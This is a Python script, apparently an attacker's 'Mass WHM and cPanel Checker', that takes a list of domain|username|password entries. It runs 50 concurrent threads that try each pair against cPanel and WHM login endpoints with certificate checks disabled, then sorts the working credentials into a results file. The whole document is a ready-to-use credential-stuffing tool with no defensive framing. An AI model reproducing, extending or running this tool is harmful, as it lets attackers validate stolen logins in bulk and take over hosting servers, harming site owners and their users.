import requests
import platform
import sys
import os
import colorama
import urllib3
import time
import threading
import concurrent.futures

# Initialize colorama and disable warnings
lock = threading.Lock()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init(autoreset=True)

r = '\x1b[31m'
g = '\x1b[32m'

def setup():
    if not os.path.isdir('Result'):
        os.mkdir('Result')

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')


def cp_whm_check(url):
    try:
        domain, username, pwd = url.split("|")
        
        # Check cPanel login
        cp_host = domain + "/login/?login_only=1"
        cp_host = cp_host.replace("http://", "https://").replace(":2082", ":2083")
        cp_log = {'user': username, 'pass': pwd}
        cp_req = requests.post(cp_host, data=cp_log, timeout=15, verify=False)
        
        # Check WHM login
        whm_host = domain + "/login/?login_only=1"
        whm_host = whm_host.replace("http://", "https://").replace(":2086", ":2087")
        whm_log = {'user': username, 'pass': pwd}
        whm_req = requests.post(whm_host, data=whm_log, timeout=15, verify=False)
        
        if 'security_token' in cp_req.text and 'security_token' in whm_req.text:
            with lock:
                print(f"{g}[+] {url}  ==> cPanel and WHM Login Successful!")
                open('Result/cPanel_WHM_Good.txt', 'a').write(url + "\n")
        else:
            with lock:
                print(f"{r}[+] {url}  ==> cPanel or WHM Login Invalid!")
                open('Result/cp_whm_bad.txt', 'a').write(url + "\n")
    except Exception as e:
        with lock:
            print(f"{r}[+] {url}  ==> cPanel/WHM Host Invalid")

def menu():
    try:
        setup()
        clear()
        print(f"{r}Mass WHM and cPanel Checker\nVersion: {g}1.0 {r}| Coder: {g}@exploitcs \n\n{g}[NOTE]{r} Format: domain|username|password \n\n")
        print(f"{g} Select Options: \n  {r}[1] Check cPanel & WHM Login\n  [2] Exit")
        selected = input(f"{g} Choose Your Options --> ")
        if selected == "2" or selected == "02":
            sys.exit(0)
        elif selected == "1" or selected == "01":
            file = input(f"{g} Provide Your List --> ")
            list = open(file, 'rt', encoding='utf-8').read().splitlines()
            with concurrent.futures.ThreadPoolExecutor(50) as executor:
                executor.map(cp_whm_check, list)
        else:
            print(f"{r}Invalid Option Selected. Please Wait\n")
            time.sleep(5)
            menu()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        sys.exit(0)
